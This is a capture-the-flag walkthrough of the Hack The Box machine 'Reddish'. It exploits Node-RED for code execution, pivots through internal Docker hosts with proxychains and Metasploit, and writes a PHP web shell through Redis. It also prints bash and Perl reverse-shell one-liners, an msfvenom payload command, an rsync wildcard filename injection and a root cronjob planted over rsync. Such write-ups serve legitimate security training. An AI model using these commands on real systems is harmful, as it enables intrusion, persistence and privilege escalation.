---
title: "Hack The Box - Reddish"
tags: [linux,insane,node-red,node red,node.js,pivoting,proxychains,metasploit,redis server,redis webshell,rsync wildcard,cronjob]
categories: HackTheBox-Linux
---

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled.png)

## NMAP :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%201.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%201.png)

## Enumerating Node.js

⇒ When we open the webpage it gives us the following error :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%202.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%202.png)

⇒ We change request method to **POST** and send request again

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%203.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%203.png)

⇒ We can access **node-red :
[http://10.10.10.94:1880/red/fad26a4411f16beb493081dae0b27824](http://10.10.10.94:1880/red/fad26a4411f16beb493081dae0b27824/)**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%204.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%204.png)

⇒ Lets exploit Node-Red to get reverse shell:
[https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/](https://quentinkaiser.be/pentesting/2018/09/07/node-red-rce/)

→ First lets add an tcp in node :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%205.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%205.png)

→ Now lets add tcp out node :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%206.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%206.png)

→ Finally an exec node in b/w : 

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%207.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%207.png)

→ Now lets start an listener on port 4444 and deploy :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%208.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%208.png)

⇒ Lets get an better shell :

**bash -c 'bash -i >& /dev/tcp/10.10.14.45/6666 0>&1'**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%209.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%209.png)

→ **nodered** machine : **172.19.0.4**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/2020-08-22_02_07_05-Window.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/2020-08-22_02_07_05-Window.png)

## Pivoting to 2nd Machine

→ Lets perform a pingsweep to discover hosts :

**for i in {1..254} ;do (ping -c 1 172.19.0.$i | grep "bytes from" &) ;done**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2010.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2010.png)

⇒ Lets get an meterpreter shell :

1) Lets generate msfvenom shell

**msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.45 LPORT=5555 -f elf > enox**

2) Convert it to base64 as there are no tools on the box that we can use to get our file :
[https://base64.guru/converter/encode/file](https://base64.guru/converter/encode/file)

3) Write the base64 encoded text to file and decode and out to file :

**cat shellbase64ed | base64 -d > shell**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2011.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2011.png)

⇒ Now lets setup proxychains :

→ First lets run autoroute :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2012.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2012.png)

→ Now lets start sock4 server :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2013.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2013.png)

→ Editing our proxychains config :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2014.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2014.png)

⇒ Running NMAP on the ip's we previously found :

**./nmap -p- -sT 172.19.0.2**

6379 is Redis default port

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2015.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2015.png)

**./nmap -p- -sT 172.19.0.4**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2016.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2016.png)

**./nmap -p- -sT 172.19.0.3**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2017.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2017.png)

→ Port forwarding the redis port :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2018.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2018.png)

⇒ Enumerating 172.19.0.3 webpage :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2019.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2019.png)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2020.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2020.png)

⇒ We previously saw that we have access to redis lets write an webshell to the backup database folder 

```
redis-cli
config set dir /var/www/html/f187a0ec71ce99642e4f0afbd441a68b
config set dbfilename redis.php
set webshell '<?php echo system($_REQUEST["cmd"]); ?>'
save
```

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2021.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2021.png)

→ We have RCE :
[http://172.19.0.3/f187a0ec71ce99642e4f0afbd441a68b/redis.php?cmd=id](http://172.19.0.3/f187a0ec71ce99642e4f0afbd441a68b/redis.php?cmd=id)

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2022.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2022.png)

⇒ Getting shell :

→ As we know this machine is on a different network so we will have to start a listener on nodered machine 

→ Uploaded ncat same way as msfvenom shell by base64 encoding :

→ Now lets get an shell :

`perl -e 'use Socket;$i="172.19.0.4";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2023.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2023.png)

### Privilege Escalation to root on 2nd machine :

⇒ Checking /etc/cron.d for cronjobs :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2024.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2024.png)

⇒ Viewing [backup.sh](http://backup.sh) :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2025.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2025.png)

→ There's one thing that stands out in this script is the rsync wildcard. We can exploit it :
[https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt](https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt)

⇒ Exploiting rsync wildcard to get shell as root :

→ First lets start an listener on nodered :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2026.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2026.png)

→ Now lets create enox.rdb with perl reverse shell :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2027.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2027.png)

→ Placing it in the folder :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2028.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2028.png)

→ Now we will create an file to execute our file :

**touch "/var/www/html/f187a0ec71ce99642e4f0afbd441a68b/-e sh enox.rdb"**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2029.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2029.png)

→ Now we wait for cron to be triggered :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2030.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2030.png)

## Pivoting to 3rd machine :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2031.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2031.png)

→ Performing pingsweep to discover hosts :

**for i in {1..254} ;do (ping -c 1 172.20.0.$i | grep "bytes from" &) ;done**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2032.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2032.png)

→ Running nmap :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2033.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2033.png)

→ We see that port 873 is open which is rsync default port.

**⇒ Enumerating Rsync :**

**rsync -rdt rsync://172.20.0.2**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2034.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2034.png)

**rsync -rdt rsync://172.20.0.2/src**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2035.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2035.png)

→ Looks like we can read system files. 

→ Lets try writing files :

**rsync enox rsync://172.20.0.2/src/tmp/**

**rsync -svdt rsync://172.20.0.2/src/tmp/**

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2036.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2036.png)

Looks like we can write files

### Exploiting rsync to get shell on 3rd machine

⇒ We will be writing an cronjob in /etc/cron.d to execute an bash script containing our perl reverse shell :

→ Creating cronjob file :

**echo '* * * * * root sh /tmp/[enox.sh](http://enox.sh)' > enoxcron**

→ enox.sh :

**perl -e 'use Socket;$i="172.20.0.3";$p=4445;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'**

→ Writing both the files

```
rsync enoxcron rsync://172.20.0.2/src/etc/cron.d/

rsync enox.sh rsync://172.20.0.2/src/tmp/**
```

→ Uploaded ncat to the 2nd machine and started listener :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2037.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2037.png)

→ Waiting for cron to be triggered :

![https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2038.png](https://raw.githubusercontent.com/CsEnox/csenox.github.io/master/img/Reddish%20Box%20c238084c8dce4904a0b15346c2be4c32/Untitled%2038.png)


⇒ Getting root flag :

**mkdir /tmp/basedjake**

**mount /dev/sda1 /tmp/basedjake**

**cat /tmp/basedjake/root.txt**
